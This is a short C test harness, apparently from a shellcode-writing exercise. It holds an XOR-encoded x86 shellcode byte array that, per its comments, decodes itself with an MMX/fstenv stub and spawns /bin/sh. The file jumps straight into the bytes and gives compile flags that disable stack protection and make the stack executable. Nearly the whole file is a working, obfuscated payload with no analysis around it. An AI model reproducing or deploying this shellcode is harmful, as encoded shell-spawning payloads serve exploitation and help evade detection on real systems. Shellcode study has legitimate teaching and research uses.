/*** 
	shellcode with XOR decoder stub and fstenv MMX FPU 
	spawning a /bin/sh shell
	Refer to mmx-xor-decoder_eip.nasm for the assembly code
	Usage: gcc -fno-stack-protector -z execstack -o mmx-xor-decoder_eip mmx-xor-decoder_eip.c
	

	Created by d7x (original stub by Vivek)
		d7x.promiselabs.net 
		www.promiselabs.net
***/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int(*ret)() = (int(*)())code;

	ret();

}

